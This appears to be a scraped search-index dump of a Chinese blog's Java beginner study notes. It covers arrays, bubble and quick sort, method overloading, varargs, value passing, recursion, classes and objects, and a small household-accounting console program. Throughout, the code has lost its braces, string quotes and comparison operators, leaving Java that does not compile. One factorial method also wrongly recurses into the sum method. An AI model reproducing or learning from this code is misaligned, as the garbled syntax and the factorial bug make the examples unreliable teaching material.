arr[arr.length - i - 1] = temp; public void reverse(String[] arr) // 复制数组 public int[] copy(int[] arr) int[] arr1 = new int[arr.length]; for (int i = 0; i arr1.length; i++) arr1[i] = arr[i]; return arr1; // 数组排序 public void sort(int[] arr) // 冒泡排序 for (int i = 0; i arr.length - 1; i++) for (int j = 0; j arr.length - 1 - i; j++) if (arr[j] arr[j + 1]) int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; // 遍历数组 public void print(int[] arr) for (int i = 0; i arr.length; i++) System.out.print(arr[i] + \\t); System.out.println(); // 查找指定元素 public int getIndex(int[] arr, int dest) // 线性查找： for (int i = 0; i arr.length; i++) if (dest == arr[i]) return i; return -1;//返回一个负数，表示没有找到 package com.atguigu.java;/** * @description: 使用自定义工具类 * @author: kkx * @create: 2021-12-12 13:44 **/public class ArrayUtilTest public static void main(String[] args) ArrayUtil util = new ArrayUtil(); int[] arr = new int[]32,34,32,5,3,54,654,-98,0,-53,5; System.out.println(最大值为 + util.getMax(arr)); System.out.println(排序前：); util.print(arr); util.sort(arr); System.out.println(排序后：); util.print(arr); System.out.println(查找：); int index = util.getIndex(arr, -5); if(index = 0) System.out.println(找到了，索引地址为： + index); else System.out.println(未找到); util.reverse(arr); 5. 方法的重载1. 定义： 在同一个类中，允许存在一个以上的同名方法，只要它们的参数个数或者参数类型不同即可。“两同一不同”:同一个类、相同方法名参数列表不同：参数个数不同，参数类型不同 2. 举例：Arrays 类中重载的 sort() binarySearch()3. 判断是否是重载：跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系！4. 在通过对象调用方法时，通过方法名和参数列表确定方法5. java 代码package com.atguigu.java1;/** * @description: 方法的重载 * @author: kkx * @create: 2021-12-12 13:56 **/public class OverLoadTest public static void main(String[] args) OverLoadTest test = new OverLoadTest(); test.getSum(1, 2); //1 test.getSum(1.0, 2.0); //2 //如果没有这个方法，则提升为double的方法 public void getSum(int i, int j) System.out.println(1); public void getSum(double d1, double d2) System.out.println(2); //传参数有顺序要求，顺序不一样也重载 public void getSum(String s ,int i) System.out.println(3); public void getSum(int i,String s) System.out.println(4); /* 如下的3个方法不能与上述4个方法构成重载 跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系 public int getSum(int i,int j) return 0; public void getSum(int m,int n) private void getSum(int i,int j) */ 6. 可变个数形参的方法 可变个数形参的格式：数据类型 … 变量名 当调用可变个数形参的方法时，传入的参数个数可以是：0 个，1 个,2 个，。。。 可变个数形参的方法与本类中方法名相同，形参不同的方法之间构成重载 可变个数形参的方法与本类中方法名相同，形参类型也相同的数组之间不构成重载。 可变个数形参在方法的形参中，必须声明在末尾 可变个数形参在方法的形参中,最多只能声明一个可变形参。 package com.atguigu.java1;import java.util.Arrays;/** * @program: project10 * @description: 可变个数形参的方法 * @author: kkx * @create: 2021-12-13 20:51 **/public class MethodArgsTest public static void main(String[] args) MethodArgsTest test = new MethodArgsTest(); test.show(hello world); test.show(new String[]AA, BB); public void show(String s) System.out.println(String s); public void show(String ... strings) System.out.println(String ... strings); System.out.println(Arrays.toString(strings)); //不能与上一个方法同时存在// public void show(String[] strs)//// 7. 关于变量的赋值 基本数据类型，此时赋值的是变量所保存的数据值。 引用数据类型，此时赋值的是变量所保存的数据的地址值。 package com.atguigu.java1;/** * @program: project10 * @description: 关于变量的赋值 * @author: kkx * @create: 2021-12-13 22:41 **/public class ValueTransferTest public static void main(String[] args) int m = 10; int n = m; System.out.println(m + \\t+ n); n = 20; System.out.println(m + \\t+ n); Order o1 = new Order(); o1.orderId = 1001; Order o2 = o1;//赋值以后，o1和o2的地址值相同 System.out.println(o1.orderId + \\t + o2.orderId); o2.orderId = 1002; System.out.println(o1.orderId + \\t + o2.orderId); class Order int orderId; package com.atguigu.java1;/** * @program: project10 * @description: 方法的形参的传递机制：值传递 * @author: kkx * @create: 2021-12-13 23:12 **/public class ValueTransferTest1 public static void main(String[] args) int m = 10; int n = 20; System.out.println(m + \\t + n); //10 20 ValueTransferTest1 test = new ValueTransferTest1(); test.swap(m, n); System.out.println(m + \\t + n); //10 20 public void swap(int m, int n) int temp = m; m = n; n = temp; package com.atguigu.java1;/** * @program: project10 * @description: 实现交换 * @author: kkx * @create: 2021-12-13 23:40 **/public class ValueTransferTest2 public static void main(String[] args) Data data = new Data(); data.m = 10; data.n = 20; System.out.println(data.m + \\t + data.n); //10 20 ValueTransferTest2 test = new ValueTransferTest2(); test.swap(data); System.out.println(data.m + \\t + data.n); //20 10 public void swap(Data data) int temp = data.m; data.m = data.n; data.n = temp; class Data int m; int n; 8. 面试题/** * @program: project10 * @description: 面试坑1 * @author: kkx * @create: 2021-12-14 23:34 **/public class test public static void main(String[] args) int a = 10; int b = 10; method(a, b); //仅输出a = 100,b = 200 System.out.println(a= + a); System.out.println(b= + b); public static void method(int a, int b) //自己编写 a = a * 10; b = b * 20; System.out.println(a); System.out.println(b); System.exit(0); /** * @program: project10 * @description: 面试坑2 * @author: kkx * @create: 2021-12-14 23:39 **/public class test1 public static void main(String[] args) int[] arr = new int[]1, 2, 3; System.out.println(arr); //地址值 char[] arr1 = new char[]a, b, c; System.out.println(arr1); //abc 9. 递归 递归方法：一个方法体内调用它自身。 方法递归包含了一种隐式的循环，它会重复执行某段代码，但这种重复执行无须循环控制。递归一定要向已知方向递归，否则这种递归就变成了无穷递归，类似于死循环。 package com.atguigu.java1;/** * @program: project10 * @description: 递归 * @author: kkx * @create: 2021-12-17 00:35 **/public class RecursionTest public static void main(String[] args) // 例1：计算1-100之间所有自然数的和 // 方式一： int sum = 0; for (int i = 1; i = 100; i++) sum += i; System.out.println(sum); // 方式二： RecursionTest test = new RecursionTest(); System.out.println(test.getSum1(100)); System.out.println(test.f(10)); System.out.println(test.fibonacci(10)); // 例1：计算1-n之间所有自然数的和 public int getSum(int n) if (n == 1) return 1; else return n + getSum(n - 1); // 例2：计算1-n之间所有自然数的乘积:n! public int getSum1(int n) if (n == 1) return 1; else return n * getSum(n - 1); //例3：已知有一个数列：f(0) = 1,f(1) = 4,f(n+2)=2*f(n+1) + f(n), public int f(int n) if (n == 0) return 1; else if(n == 1) return 4; else return 2 * f(n - 1) + f(n - 2); //例4：斐波那契数列 public int fibonacci(int n) if (n == 0) return 0; else if(n == 1) return 1; else return fibonacci(n - 1) + fibonacci(n - 2); //例5：汉诺塔问题 //例6：快排","tags":["Java","学习笔记","基础","类"],"categories":["Java学习笔记"]},{"title":"java学习笔记9","path":"//coding/java/note/9.html","content":"1. java 面向对象学习的三条主线 Java 类及类的成员：属性、方法、构造器；代码块、内部类 面向对象的三大特征：封装性、继承性、多态性、(抽象性) 其它关键字：this、super、static、final、abstract、interface、package、import 等 2. 面向对象和面向过程的区别面向过程：强调的是功能行为，以函数为最小单位，考虑怎么做。① 把冰箱门打开② 抬起大象，塞进冰箱② 把冰箱门关闭 面向对象：强调具备了功能的对象，以类对象为最小单位，考虑谁来做。人 打开(冰箱) 冰箱.开开(); 抬起(大象) 大象.进入(冰箱); 关闭(冰箱) 冰箱.闭合(); 冰箱 开开() 闭合() 大象 进入(冰箱) 3. 面向对象的两个要素： 类：对一类事物的描述，是抽象的、概念上的定义对象：是实际存在的该类事物的每个个体，因而也称为实例(instance)面向对象程序设计的重点是类的设计。设计类，就是设计类的成员。 4. 类和对象的使用 创建类，设计类的成员 属性 成员变量 field 域、字段 方法 成员方法 函数 method 创建类的对象 类的实例化 实例化类 创建类的对象 通过“对象.属性”或“对象.方法”调用对象的结构 如果创建了一个类的多个对象，则每个对象都独立的拥有一套类的属性。（非 static 的）意味着：如果我们修改一个对象的属性 a，则不影响另外一个对象属性 a 的值。 java 代码package com.atguigu.java;public class PersonTest public static void main(String[] args) //2. 创建Person类的对象 Person p1 = new Person(); //调用对象的结构：属性、方法 //调用属性：“对象.属性” p1.name = Tom; p1.isMale = true; System.out.println(p1.name); //调用方法：“对象.方法” p1.eat(); p1.talk(中文); Person p2 = new Person(); System.out.println(p2.name); //null System.out.println(p2.isMale); //false //将p1变量保存的对象地址值赋给p3,导致p1和p3指向了堆空间中的同一个对象实体。 Person p3 = p1; System.out.println(p3.name); //Tom p3.age = 10; System.out.println(p1.age); //10 //1.创建类，设计类的成员class Person String name; int age = 1; boolean isMale; public void eat() System.out.println(eat); public void sleep() System.out.println(sleep); public void talk(String language) System.out.println(说的是 + language); 5. 类中属性的使用属性（成员变量） vs 局部变量 相同点： 定义变量的格式：数据类型 变量名 变量值 先声明，后使用 变量都有其对应的作用域 不同点： 在类中声明的位置的不同 属性：直接定义在类的一对{}内局部变量：声明在方法内、方法形参、代码块内、构造器形参、构造器内部的变量 关于权限修饰符的不同 属性：可以在声明属性时，指明其权限，使用权限修饰符。常用的权限修饰符：private、public、缺省(default)、protected —封装性。缺省常用。局部变量：不可以使用权限修饰符。 默认初始化值的情况： 属性：类的属性，根据其类型，都有默认初始化值。 整型（byte、short、int、long）：0 浮点型（float、double）：0.0 字符型（char）：0 （或’\\u0000’） 布尔型（boolean）：false 引用数据类型（类、数组、接口）：null 局部变量：没有默认初始化值。 意味着，我们在调用局部变量之前，一定要显式赋值。 特别地：形参在调用时，我们赋值即可。 在内存中加载的位置： 属性：加载到堆空间中 （非 static） 局部变量：加载到栈空间 6. 类中方法的声明和使用1. 方法：描述类应该具有的功能。 比如：Math 类：sqrt()\\random() ...Scanner 类：nextXxx() …Arrays 类：sort() \\ binarySearch() \\ toString() \\ equals() \\ … 下面是自己写的类：public void eat(){}public void sleep(int hour){}public String getName(){}public String getNation(String nation){} 2. 方法的声明：权限修饰符 返回值类型 方法名(形参列表) 方法体 注意：static、final、abstract 来修饰的方法 3. Tip 关于权限修饰符：默认方法的权限修饰符先都使用 public。Java 规定的 4 种权限修饰符：private、public、缺省、protected 返回值类型： 有返回值 vs 没有返回值 如果方法有返回值，则必须在方法声明时，指定返回值的类型。并用 return 关键字来返回指定类型的变量或常量：“return 数据”。如果方法没有返回值，用 void 来表示。通常，没有返回值则不需要使用 return.但是，如果使用的话，只能“return;”表示结束此方法的意思。 我们定义方法该不该有返回值？ 题目要求 凭经验 方法名：属于标识符，遵循标识符的规则和规范，“见名知意” 形参列表： 方法可以声明 0 个，1 个，或多个形参。 格式：数据类型 1 形参 1,数据类型 2 形参 2,… 我们定义方法时，该不该定义形参？ 题目要求 凭经验 方法体：方法功能的体现。 return 关键字的使用： 使用范围：使用在方法体中 作用： 结束方法 针对于有返回值类型的方法，使用”return 数据”方法返回所要的数据。 注意点：return 关键字后面不可以声明执行语句。 方法的使用中，可以调用当前类的属性或方法特殊的：方法 A 中又调用了方法 A:递归方法。方法中，不可以定义方法。 可以直接在同一个包下面定义自己的类，名字尾缀为 java，最开始不需要 import package com.atguigu.exer;public class Person String name; int age; /** * sex:1 表明是男性 * sex:0 表明是女性 */ int sex; public void study() System.out.println(studying); public void showAge() System.out.println(age: + age); public int addAge(int i) age += i; return age; package com.atguigu.exer;/* * 要求： * (1)创建Person类的对象，设置该对象的name、age和sex属性，调用study方法， * 输出字符串“studying”，调用showAge()方法显示age值， * 调用addAge()方法给对象的age属性值增加2岁。 * (2)创建第二个对象，执行上述操作，体会同一个类的不同对象之间的关系。 */public class PersonTest public static void main(String[] args) Person p1 = new Person(); p1.name = Tom; p1.age = 18; p1.sex = 1; p1.study(); p1.showAge(); int newAge = p1.addAge(2); System.out.println(p1.name + 的新年龄为： + newAge); System.out.println(p1.age); //20 Person p2 = new Person(); p2.showAge(); //0 p2.addAge(10); p2.showAge(); //10 4. java 代码package com.atguigu.java;public class CustomerTest public static void main(String[] args) Customer cust1 = new Customer(); //cust1.eat(); 报错 cust1.sleep(8); class Customer String name; int age; boolean isMale; private void eat() System.out.println(客户吃饭); public void sleep(int hour) System.out.println(休息了 + hour + 个小时); eat(); public String getName() if (age 18) return name; else return Tom; public String getNation(String nation) String info = 国籍为 + nation; return info; package com.atguigu.java;public class UserTest public static void main(String[] args) User u1 = new User(); System.out.println(u1.name); System.out.println(u1.age); System.out.println(u1.isMale); u1.talk(汉语); u1.eat(); class User //属性（或成员变量） String name; public int age; boolean isMale; public void talk(String language) //局部变量 System.out.println(我们用 + language); public void eat() String food = 饼; //局部变量 System.out.println(一个 + food); package com.atguigu.exer;public class StudentTest1 public static void main(String[] args) Student1[] s1 = new Student1[20]; for (int i = 0; i s1.length; i++) s1[i] = new Student1(); s1[i].number = (i + 1); //年级：[1,6] s1[i].state = (int)(Math.random() * (6 - 1 + 1) + 1); //成绩：[0,100] s1[i].score = (int) (Math.random() * (100 - 0 + 1)); StudentTest1 test = new StudentTest1(); test.print(s1); System.out.println(); test.seacchState(s1, 3); System.out.println(); test.sort(s1); test.print(s1); /** * 遍历学生数组 * @param s1 */ public void print(Student1[] s1) for (int i = 0; i s1.length; i++) System.out.println(s1[i].info()); /** *问题一：打印出指定年级的学生信息。 * @param s1 要查找的数组 * @param state 要查找的年级 */ public void seacchState(Student1[] s1, int state) for (int i = 0; i s1.length; i++) if (s1[i].state == state) System.out.println(s1[i].info()); /** * 使用冒泡排序按学生成绩排序 * @param s1 */ public void sort(Student1[] s1) for (int i = 0; i s1.length - 1; i++) for (int j = 0; j s1.length - 1 - i; j++) if (s1[j].score s1[j + 1].score) //注意这里交换的是对象 Student1 temp = s1[j]; s1[j] = s1[j + 1]; s1[j + 1] = temp; class Student1 int number;; //学号 int state; //年级 int score; //成绩 //显示学生信息 public String info() return 学号： + number + ,年级： + state + ,成绩： + score;","tags":["Java","学习笔记","基础","类"],"categories":["Java学习笔记"]},{"title":"java学习笔记8","path":"//coding/java/note/8.html","content":"数组常见算法1. 数组元素的赋值(杨辉三角，回文数等)杨辉三角package com.atguigu.exer;/*使用二维数组打印一个 10 行杨辉三角。【提示】 1. 第一行有 1 个元素, 第 n 行有 n 个元素 2. 每一行的第一个元素和最后一个元素都是 1 3. 从第三行开始, 对于非第一个元素和最后一个元素的元素。即：yanghui[i][j] = yanghui[i-1][j-1] + yanghui[i-1][j]; */public class YangHuiTest public static void main(String[] args) //1.声明并初始化二维数组 int[][] yangHui = new int[10][]; //2.给数组的元素赋值 for (int i = 0; i yangHui.length; i++) yangHui[i] = new int[i + 1]; //2.1 给首末元素赋值 yangHui[i][0] = yangHui[i][i] = 1; //2.2 给每行的非首末元素赋值 for (int j = 1; j yangHui[i].length - 1; j++) yangHui[i][j] = yangHui[i-1][j-1] + yangHui[i-1][j]; //3.遍历二维数组 for (int j = 0; j yangHui[i].length; j++) System.out.print(yangHui[i][j] + \\t); System.out.println(); 2. 求数值型数组中元素的最大值、最小值、平均数、总和等package com.atguigu.java;public class ArrayTest1 public static void main(String[] args) int [] arr = new int[10]; for (int i = 0; i arr.length; i++) arr[i] = (int) (Math.random() * (99 -10 + 1) + 10); //遍历 for(int i = 0;i arr.length;i++) System.out.print(arr[i] + \\t); System.out.println(); //求数组元素的最大值 int maxValue = arr[0]; for (int i = 1; i arr.length; i++) if (maxValue arr[i]) maxValue = arr[i]; System.out.println(最大值为： + maxValue); //求数组元素的最小值 int minValue = arr[0]; for (int i = 1; i arr.length; i++) if (minValue arr[i]) minValue = arr[i]; System.out.println(最小值为： + minValue); //求数组元素的总和 int sum = 0; for (int i = 0; i arr.length; i++) sum += arr[i]; System.out.println(总和为： + sum); //求数组元素的平均数 int avgValue = sum / arr.length; System.out.println(平均数为： + avgValue); 3. 数组的复制、反转、查找(线性查找、二分法查找)package com.atguigu.java;public class ArrayTest2 public static void main(String[] args) String[] arr = new String[]JJ,DD,MM,BB,GG,AA; //数组的复制 String[] arr1 = new String[arr.length]; for (int i = 0; i arr1.length; i++) arr1[i] = arr[i]; //数组的反转 for (int i = 0; i arr.length / 2; i++) String temp = arr[i]; arr[i] = arr[arr.length - i - 1]; arr[arr.length - i - 1] = temp; for (int i = 0, j = arr.length - 1; i j; i++, j--) String temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; //遍历 for(int i = 0;i arr.length;i++) System.out.print(arr[i] + \\t); System.out.println(); //查找 //线性查找 String dest = BB; dest = CC; boolean isFlag = true; for (int i = 0; i arr.length; i++) if (dest.equals(arr[i])) System.out.println(位置为： + i); isFlag = false; break; if (isFlag) System.out.println(没找到); //二分法查找，效率高 //前提：所要查找的数组必须有序。 int [] arr2 =new int[]-98,-34,2,34,54,66,79,105,210,333; int dest1 = -34; dest1 = 35; int head_index = 0; //初始的首索引 int end_index = arr2.length - 1; //初始的末索引 boolean isFlag1 = true; while (head_index = end_index) int middle_index = (head_index + end_index) / 2; if (dest1 == arr2[middle_index]) System.out.println(位置为： + middle_index); isFlag = false; break; else if(arr2[middle_index] dest1) end_index = middle_index- 1 ; else head_index = middle_index + 1; if (isFlag) System.out.println(没找到); 4. 排序算法1. 衡量排序算法的优劣： 时间复杂度：分析关键字的比较次数和记录的移动次数 空间复杂度：分析排序算法中需要多少辅助内存 稳定性：若两个记录 A 和 B 的关键字值相等，但排序后 A、B 的先后次序保持不变，则称这种排序算法是稳定的。 2. 排序算法分类：内部排序和外部排序。 内部排序：整个排序过程不需要借助于外部存储器（如磁盘等），所有排序操作都在内存中完成。 外部排序：参与排序的数据非常多，数据量非常大，计算机无法把整个排序过程放在内存中完成，必须借助于外部存储器（如磁盘）。外部排序最常见的是多路归并排序。可以认为外部排序是由多次内部排序组成。 3. 十大内部排序算法 选择排序 直接选择排序 堆排序 交换排序 冒泡排序 快速排序 插入排序 直接插入排序 折半插入排序 Shell 排序 归并排序 桶式排序 基数排序 4. 算法的 5 大特征 输入（Input）：有 0 个或多个输入数据，这些输入必须有清楚的描述和定义 输出（Output）：至少有 1 个或多个输出结果，不可以没有输出结果 有穷性（有限性，Finiteness）：算法在有限的步骤之后会自动结束而不会无限循环，并且每一个步骤可以在可接受的时间内完成 确定性（明确性，Definiteness）：算法中的每一步都有确定的含义，不会出现二义性 可行性（有效性，Effectiveness）：算法的每一步都是清楚且可行的，能让用户用纸笔计算而求出答案 5. java 代码// 冒泡排序package com.atguigu.java;public class BubbleSortTest public static void main(String[] args) int [] arr = new int[] 43,32,76,-98,0,64,33,-21,32,99; for(int i = 0;i arr.length - 1;i++) for(int j = 0;j arr.length - 1 - i;j++) if(arr[j] arr[j + 1]) int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; for (int i = 0; i arr.length; i++) System.out.print(arr[i] + \\t); // 快速排序package com.atguigu.java;public class QuickSort private static void swap(int[] data, int i, int j) int temp = data[i]; data[i] = data[j]; data[j] = temp; private static void subSort(int[] data, int start, int end) if (start end) int base = data[start]; int low = start; int high = end + 1; while (true) while (low end data[++low] - base = 0) ; while (high start data[--high] - base = 0) ; if (low high) swap(data, low, high); else break; swap(data, start, high); subSort(data, start, high - 1);//递归调用 subSort(data, high + 1, end); public static void quickSort(int[] data) subSort(data,0,data.length-1); public static void main(String[] args) int[] data = 9, -16, 30, 23, -30, -49, 25, 21, 30 ; System.out.println(排序之前： + java.util.Arrays.toString(data)); quickSort(data); System.out.println(排序之后： + java.util.Arrays.toString(data)); 5. Arrays 工具类的使用 常用的类 作用 boolean equals(int[] a,int[] b) 判断两个数组是否相等。 String toString(int[] a) 输出数组信息。 void fill(int[] a,int val) 将指定值填充到数组之中。 void sort(int[] a) 对数组进行排序。 int binarySearch(int[] a,int key) 对排序后的数组进行二分法检索指定的值。 java 代码package com.atguigu.java;import java.util.Arrays;public class ArraysTest public static void main(String[] args) //1.boolean equals(int[] a,int[] b) int [] arr1 = new int[]1,2,3,4; int [] arr2 = new int[]1,3,2,4; boolean isEquals = Arrays.equals(arr1, arr2); System.out.println(isEquals); //false //2.String toString System.out.println(Arrays.toString(arr1)); //[1, 2, 3, 4] //3.void fill(int[] a,int val) Arrays.fill(arr1, 10); System.out.println(Arrays.toString(arr1)); //[10, 10, 10, 10] //4.void sort(int[] a) Arrays.sort(arr2); System.out.println(Arrays.toString(arr2)); //[1, 2, 3, 4] ////5.int binarySearch(int[] a,int key) 要有序 int[] arr3 = new int[]-98,-34,2,34,54,66,79,105,210,333; int index = Arrays.binarySearch(arr3, 210); if (index = 10) System.out.println(index); else System.out.println(没找到); 6. 数组使用中的常见异常 数组角标越界的异常：ArrayIndexOutOfBoundsExcetion 空指针异常：NullPointerException java 代码package com.atguigu.java;public class ArrayExceptionTest public static void main(String[] args) //1. 数组角标越界的异常：ArrayIndexOutOfBoundsExcetion int[] arr = new int[]1,2,3,4,5; //System.out.println(arr[5]); //System.out.println(arr[-2]); //2.2. 空指针异常：NullPointerException //情况一 int[] arr1 = new int[]1, 2, 3; arr1 = null; //System.out.println(arr1[0]); //情况二 int[][] arr2 = new int[4][]; //System.out.println(arr2[0][0]); 要初始化 //情况三： String[] arr3 = new String[]AA, BB, CC; //arr3[0] = null; System.out.println(arr3[0].toString());","tags":["算法","Java","学习笔记","基础","数组"],"categories":["Java学习笔记"]},{"title":"java学习笔记7","path":"//coding/java/note/7.html","content":"1. 数组1. 概念 数组(Array)，是多个相同类型数据按一定顺序排列的集合，并使用一个名字命名，并通过编号的方式对这些数据进行统一管理 2. 组成 数组名 元素 索引 数组的长度：元素的个数 3. 特点 数组是有序排列的 数组属于引用数据类型的变量。数组的元素，既可以是基本数据类型，也可以是引用数据类型 创建数组对象会在内存中开辟一整块连续的空间 数组的长度一旦确定，就不能修改。 4. 数组分类 按照维数：一维数组、二维数组、。。。 按照数组元素的类型：基本数据类型元素的数组、引用数据类型元素的数组 2. 一维数组1. 一维数组的使用 一维数组的声明和初始化 如何调用数组的指定位置的元素 如何获取数组的长度 如何遍历数组 数组元素的默认初始化值 ：见 ArrayTest1.java 数组元素是整型：0数组元素是浮点型：0.0数组元素是 char 型：0 或’\\u0000’，而非’0’数组元素是 boolean 型：false数组元素是引用数据类型：null 数组的内存解析 ：见 ArrayTest1.java package com.atguigu.java;public class ArrayTest public static void main(String[] args) //1. 一维数组的声明和初始化 int [] ids;//声明 //1.1 静态初始化:数组的初始化和数组元素的赋值操作同时进行 ids = new int[]01, 02, 03, 04, 05; //1.2动态初始化:数组的初始化和数组元素的赋值操作分开进行 String [] names = new String[5]; int[] arr1 = new int[] 1,2,3,4,5; int[] arr4 = 1,2,3,4,5;//类型推断 //2.如何调用数组的指定位置的元素:通过角标的方式调用。 names[0] = 00; names[1] = 11; names[2] = 22; names[3] = 33; names[4] = 44; //3.如何获取数组的长度。(length) System.out.println(names.length); //4.如何遍历数组 for (int i = 0; i names.length; i++) System.out.println(names[i]); package com.atguigu.java;public class ArrayTest1 public static void main(String[] args) //5.数组元素的默认初始化值 int [] arr = new int[4]; for (int i = 0; i arr.length; i++) System.out.println(arr[i]); short [] arr1 = new short[4]; System.out.println(arr1[0]); float[] arr2 = new float[4]; System.out.println(arr2[0]); char[] arr3 = new char[4]; System.out.println(arr3[0]); //0 if(arr3[0] == 0) System.out.println(你好！); //进来这里 boolean[] arr4 = new boolean[4]; System.out.println(arr4[0]); String [] arr5 = new String[4]; System.out.println(arr5[0]); //null if(arr5[0] == null) System.out.println(北京天气不错！); //进来这里 2. 一维数组例题/*从键盘读入学生成绩，找出最高分，并输出学生成绩等级。 成绩=最高分-10 等级为’A’ 成绩=最高分-20 等级为’B’ 成绩=最高分-30 等级为’C’ 其余 等级为’D’*/package com.atguigu.exer;import java.util.Scanner;public class ArrayDemo1 public static void main(String[] args) //1.使用Scanner，读取学生个数 Scanner scanner = new Scanner(System.in); System.out.println(学生人数); int number = scanner.nextInt(); //2.创建数组，存储学生成绩：动态初始化 int[] scores = new int[number]; //3.给数组中的元素赋值 System.out.println(请输入 + number + 个学生成绩：); int maxScore = 0; for (int i = 0; i scores.length; i++) scores[i] = scanner.nextInt(); //4.获取数组中的元素的最大值:最高分 if (maxScore scores[i]) maxScore = scores[i]; //5.根据每个学生成绩与最高分的差值，得到每个学生的等级，并输出等级和成绩 char level; for (int i = 0; i scores.length; i++) if (maxScore - scores[i] = 10) level = A; else if(maxScore - scores[i] = 20) level = B; else if(maxScore - scores[i] = 30) level = C; else level = D; System.out.println(student + i + 成绩为 + scores[i] + 等级为 + level); 3. 二维数组1. 二维数组的概念 对于二维数组的理解，我们可以看成是一维数组 array1 又作为另一个一维数组 array2 的元素而存在。其实，从数组底层的运行机制来看，其实没有多维数组 2. 二维数组的使用: 二维数组的声明和初始化 如何调用数组的指定位置的元素 如何获取数组的长度 如何遍历数组 数组元素的默认初始化值 :见 ArrayTest3.java 针对于初始化方式一：比如：int[][] arr new int[4][3];外层元素的初始化值为：地址值内层元素的初始化值为：与一维数组初始化情况相同 针对于初始化方式二：比如：int[][] arr new int[4][];外层元素的初始化值为：null内层元素的初始化值为：不能调用，否则报错。 数组的内存解析 :见 ArrayTest3.java package com.atguigu.java;public class ArrayTest2 public static void main(String[] args) //1.二维数组的声明和初始化 int [][] arr1 = new int [][]1, 2, 3, 4, 5, 6, 7, 8, 9; String [][] arr2 = new String[3][2]; String [][] arr3 = new String[3][]; int arr4 [][] = new int[][]1,2,3,4,5,9,10,6,7,8; int[] arr5[] = 1,2,3,4,5,6,7,8; //2.如何调用数组的指定位置的元素 System.out.println(arr1[0][1]); //2 System.out.println(arr2[1][1]); //null arr3[1] = new String[4]; // System.out.println(arr3[1][0]); //3.获取数组的长度 System.out.println(arr4.length); //3 System.out.println(arr4[0].length); //3 //4.如何遍历二维数组 for (int i = 0; i arr4.length; i++) for (int j = 0; j arr4[i].length; j++) System.out.print(arr4[i][j] + \\t); System.out.println(); package com.atguigu.java;public class ArrayTest3 public static void main(String[] args) int [][] arr = new int[4][3]; System.out.println(arr); // 内存地址 System.out.println(arr[0]); // 内存地址 System.out.println(arr[0][0]); // 0 float [][] arr1 = new float[4][3]; System.out.println(arr1[0]); // 内存地址 System.out.println(arr1[0][0]); // 0.0 String[][] arr2 = new String[4][3]; System.out.println(arr2[0]); //地址值 System.out.println(arr2[0][0]); //null double[][] arr3 = new double[4][]; System.out.println(arr3[0]); //null //System.out.println(arr3[0][0]); //报错，空指针","tags":["Java","学习笔记","基础","数组"],"categories":["Java学习笔记"]},{"title":"java project 家庭收支记账软件","path":"//coding/java/project/1.html","content":"家庭收支记账软件1. 自己编写的 java 文件FamilyAccount.java//FamilyAccount.javapublic class FamilyAccount public static void main(String[] args) boolean isFlag = true; String details = 收支\\t账户金额\\t收支金额\\t说 明 ; int balance = 10000; while (isFlag) System.out.println(-----------------家庭收支记账软件----------------- ); System.out.println( 1 收支明细); System.out.println( 2 登记收入); System.out.println( 3 登记支出); System.out.println( 4 退 出 ); System.out.print( 请选择(1-4)：); //获取输入 char selection = Utility.readMenuSelection(); switch (selection) case 1: //1.收支明细 System.out.println(-----------------当前收支明细记录-----------------); System.out.println(details); System.out.println(--------------------------------------------------); break; case 2: //2.登记收入 System.out.print(本次收入金额：); int addMoney = Utility.readNumber(); System.out.print(本次收入说明：); String addInfo = Utility.readString(); balance += addMoney; details += (收入\\t + balance + \\t\\t + addMoney + \\t\\t + addInfo + ); System.out.println(---------------------登记完成--------------------- ); break; case 3: //3.登记支出 System.out.print(本次支出金额：); int minusMoney = Utility.readNumber(); System.out.print(本次支出说明：); String minusInfo = Utility.readString(); if (balance = minusMoney) balance -= minusMoney; details += (支出\\t + balance + \\t\\t + minusMoney + \\t\\t + minusInfo + ); else System.out.println(钱不够，付不了~~~); System.out.println(---------------------登记完成--------------------- ); break; case 4: //4.退 出 System.out.print(确认是否退出(Y/N)：); char isExit = Utility.readConfirmSelection(); if (isExit == Y) isFlag = false; break; 2. 别人写好的工具类Utility.java//Utility.javaimport java.util.Scanner;/** Utility工具类： 将不同的功能封装为方法，就是可以直接通过调用方法使用它的功能，而无需考虑具体的功能实现细节。 */public class Utility private static Scanner scanner = new Scanner(System.in); /** 用于界面菜单的选择。该方法读取键盘，如果用户键入’1’-’4’中的任意字符，则方法返回。返回值为用户键入字符。 */ public static char readMenuSelection() char c; for (; ; ) String str = readKeyBoard(1); c = str.charAt(0); if (c != 1 c != 2 c != 3 c != 4) System.out.print(选择错误，请重新输入：); else break; return c; /** 用于收入和支出金额的输入。该方法从键盘读取一个不超过4位长度的整数，并将其作为方法的返回值。 */ public static int readNumber() int n; for (; ; ) String str = readKeyBoard(4); try n = Integer.parseInt(str); break; catch (NumberFormatException e) System.out.print(数字输入错误，请重新输入：); return n; /** 用于收入和支出说明的输入。该方法从键盘读取一个不超过8位长度的字符串，并将其作为方法的返回值。 */ public static String readString() String str = readKeyBoard(8); return str; /** 用于确认选择的输入。该方法从键盘读取‘Y’或’N’，并将其作为方法的返回值。 */ public static char readConfirmSelection() char c; for (; ; ) String str = readKeyBoard(1).toUpperCase(); c = str.charAt(0); if (c == Y || c == N) break; else System.out.print(选择错误，请重新输入：); return c; private static String readKeyBoard(int limit) String line = ; while (scanner.hasNext()) line = scanner.nextLine(); if (line.length() 1 || line.length() limit) System.out.print(输入长度（不大于 + limit + ）错误，请重新输入：); continue; break; return line;","tags":["Java","基础","项目"],"categories":["Java项目"]},{"title":"java学习笔记6","path":"//coding/java/note/6.html","content":"1. 嵌套循环的使用1. 定义将一个循环结构 A 声明在另一个循环结构 B 的循环体中,就构成了嵌套循环 2. java 代码public class ForForTest public static void main(String[] args) for (int i = 0; i 5; i++) System.out.print(*); System.out.println( ); for (int j = 0; j 4; j++) for (int i = 0; i 5; i++) System.out.print(*); System.out.println(); /* i(行号) j(*的个数) * 1 1 ** 2 2 *** 3 3 **** 4 4 ***** 5 5 */ for (int i = 0; i 5; i++) for (int j = 0; j = i; j++) System.out.print(*); System.out.println(); /* i(行号) j(*的个数) 规律：i + j = 5 换句话说：j = 5 - i; **** 1 4 *** 2 3 ** 3 2 * 4 1 */ for (int i = 0; i 4; i++) for (int j = 0; j 4 - i; j++) System.out.print(*); System.out.println(); 3. Tip 内层遍历一遍，相当于外层循环一次 假设外层循环执行 